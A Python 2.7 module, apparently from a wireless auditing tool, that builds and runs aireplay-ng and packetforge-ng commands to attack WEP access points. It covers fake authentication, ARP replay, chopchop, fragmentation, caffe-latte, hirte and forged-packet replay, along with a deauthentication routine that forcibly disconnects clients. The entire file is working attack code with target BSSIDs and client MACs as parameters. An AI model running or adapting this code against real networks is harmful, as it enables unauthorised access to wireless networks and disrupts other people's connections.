#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

from Configuration import Configuration
from Process import Process

import os, time

class WEPAttackType(object):
    ''' Enumeration of different WEP attack types '''
    fakeauth     = 0
    replay       = 1
    chopchop     = 2
    fragment     = 3
    caffelatte   = 4
    p0841        = 5
    hirte        = 6
    forgedreplay = 7

    def __init__(self, var):
        '''
            Sets appropriate attack name/value given an input.
            Args:
                var - Can be a string, number, or WEPAttackType object
                      This object's name & value is set depending on var.
        '''
        self.value = None
        self.name = None
        if type(var) == int:
            for (name,value) in WEPAttackType.__dict__.iteritems():
                if type(value) == int:
                    if value == var:
                        self.name = name
                        self.value = value
                        return
            raise Exception("Attack number %d not found" % var)
        elif type(var) == str:
            for (name,value) in WEPAttackType.__dict__.iteritems():
                if type(value) == int:
                    if name == var:
                        self.name = name
                        self.value = value
                        return
            raise Exception("Attack name %s not found" % var)
        elif type(var) == WEPAttackType:
            self.name = var.name
            self.value = var.value
        else:
            raise Exception("Attack type not supported")

    def __str__(self):
        return self.name


class Aireplay(object):
    def __init__(self, target, attack_type, client_mac=None, replay_file=None, devnull=False):
        '''
            Starts aireplay process.
            Args:
                target - Instance of Target object, AP to attack.
                attack_type - int, str, or WEPAttackType instance.
                client_mac - MAC address of an associated client.
        '''
        cmd = Aireplay.get_aireplay_command(target,
                                            attack_type,
                                            client_mac=client_mac,
                                            replay_file=replay_file)

        # TODO: set 'stdout' when creating process to store output to file.
        # AttackWEP will read file to get status of attack.
        # E.g., chopchop will regex "\(\s?(\d+)% done" to get percent complete.
        '''
        if not devnull and attack_type == WEPAttackType.chopchop:
            sout = open(Configuration.temp('chopchop.out'), 'w')
            # Output sample:
            # Offset   70 (11% done) | xor = 7A | pt = 00 |   24 frames written in   409ms
        else:
            sout = Process.devnull()
        serr = Process.devnull()
        '''

        self.pid = Process(cmd,
                           devnull=devnull,
                           cwd=Configuration.temp())

    def is_running(self):
        return self.pid.poll() == None

    def stop(self):
        ''' Stops aireplay process '''
        if self.pid and self.pid.poll() == None:
            self.pid.interrupt()

    def get_output(self):
        ''' Returns stdout from aireplay process '''
        return self.pid.stdout()

    @staticmethod
    def get_aireplay_command(target, attack_type,
                             client_mac=None, replay_file=None):
        '''
            Generates aireplay command based on target and attack type
            Args:
                target      - Instance of Target object, AP to attack.
                attack_type - int, str, or WEPAttackType instance.
                client_mac  - MAC address of an associated client.
                replay_file - .Cap file to replay via --arpreplay
        '''

        # Interface is required at this point
        Configuration.initialize()
        if Configuration.interface == None:
            raise Exception("Wireless interface must be defined (-i)")

        cmd = ['aireplay-ng']
        cmd.append('--ignore-negative-one')

        if not client_mac and len(target.clients) > 0:
            # Client MAC wasn't specified, but there's an associated client. Use that.
            client_mac = target.clients[0].station

        # type(attack_type) might be str, int, or WEPAttackType.
        # Find the appropriate attack enum.
        attack_type = WEPAttackType(attack_type).value

        if attack_type == WEPAttackType.fakeauth:
            cmd.extend(['-1', '0']) # Fake auth, no delay
            cmd.extend(['-a', target.bssid])
            cmd.extend(['-T', '3']) # Make 3 attempts
            if target.essid_known:
                cmd.extend(['-e', target.essid])
            # Do not specify client MAC address,
            # we're trying to fake-authenticate using *our* MAC

        elif attack_type == WEPAttackType.replay:
            cmd.append('--arpreplay')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.chopchop:
            cmd.append('--chopchop')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            cmd.extend(['-m', '60']) # Minimum packet length (bytes)
            cmd.extend(['-n', '82']) # Maximum packet length
            cmd.extend(['-F'])       # Automatically choose first packet
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.fragment:
            cmd.append('--fragment')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            cmd.extend(['-m', '100']) # Minimum packet length (bytes)
            cmd.extend(['-F'])       # Automatically choose first packet
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.caffelatte:
            cmd.append('--caffe-latte')
            cmd.extend(['-b', target.bssid])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.p0841:
            cmd.append('--arpreplay')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-c', 'ff:ff:ff:ff:ff:ff'])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            cmd.extend(['-F']) # Automatically choose first packet
            cmd.extend(['-p', '0841'])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.hirte:
            if client_mac == None:
                # Unable to carry out hirte attack
                raise Exception("Client is required for hirte attack")
            cmd.append('--cfrag')
            cmd.extend(['-h', client_mac])
        elif attack_type == WEPAttackType.forgedreplay:
            if client_mac == None or replay_file == None:
                raise Exception(
                    "Client_mac and Replay_File are required for arp replay")
            cmd.append('--arpreplay')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-h', client_mac])
            cmd.extend(['-r', replay_file])
            cmd.extend(['-F']) # Automatically choose first packet
            cmd.extend(['-x', str(Configuration.wep_pps)])
        else:
            raise Exception("Unexpected attack type: %s" % attack_type)

        cmd.append(Configuration.interface)
        return cmd

    @staticmethod
    def get_xor():
        ''' Finds the last .xor file in the directory '''
        xor = None
        for fil in os.listdir(Configuration.temp()):
            if fil.startswith('replay_') and fil.endswith('.xor'):
                xor = fil
        return xor

    @staticmethod
    def forge_packet(xor_file, bssid, station_mac):
        ''' Forges packet from .xor file '''
        forged_file = 'forged.cap'
        cmd = [
            'packetforge-ng',
            '-0',
            '-a', bssid,           # Target MAC
            '-h', station_mac,     # Client MAC
            '-k', '192.168.1.2',   # Dest IP
            '-l', '192.168.1.100', # Source IP
            '-y', xor_file,        # Read PRNG from .xor file
            '-w', forged_file,     # Write to
            Configuration.interface
        ]

        cmd = '"%s"' % '" "'.join(cmd)
        (out, err) = Process.call(cmd, cwd=Configuration.temp(), shell=True)
        if out.strip() == 'Wrote packet to: %s' % forged_file:
            return forged_file
        else:
            from Color import Color
            Color.pl('{!} {R}failed to forge packet from .xor file{W}')
            Color.pl('output:\n"%s"' % out)
            return None

    @staticmethod
    def deauth(target_bssid, client_mac=None, num_deauths=1, timeout=2):
        deauth_cmd = [
            'aireplay-ng',
            '-0', # Deauthentication
            str(num_deauths),
            '--ignore-negative-one',
            '-a', target_bssid # Target AP
        ]
        if client_mac is not None:
            # Station-specific deauth
            deauth_cmd.extend(['-c', client_mac])
        deauth_cmd.append(Configuration.interface)
        proc = Process(deauth_cmd)
        while proc.poll() is None:
            if proc.running_time() >= timeout:
                proc.interrupt()
            time.sleep(0.2)

if __name__ == '__main__':
    t = WEPAttackType(4)
    print t.name, type(t.name), t.value
    t = WEPAttackType('caffelatte')
    print t.name, type(t.name), t.value

    t = WEPAttackType(t)
    print t.name, type(t.name), t.value

    from Target import Target
    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e, WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    t = Target(fields)

    cmd = Aireplay.get_aireplay_command(t, 'fakeauth')
    print ' '.join(['"%s"' % a for a in cmd])

    '''
    aireplay = Aireplay(t, 'replay')
    while aireplay.is_running():
        from time import sleep
        sleep(0.1)
    print aireplay.get_output()
    '''

    '''
    forge = Aireplay.forge_packet('/tmp/replay_dec-0605-060243.xor', \
                                  'A4:2B:8C:16:6B:3A', \
                                  '00:C0:CA:4E:CA:E0')
    print forge
    '''
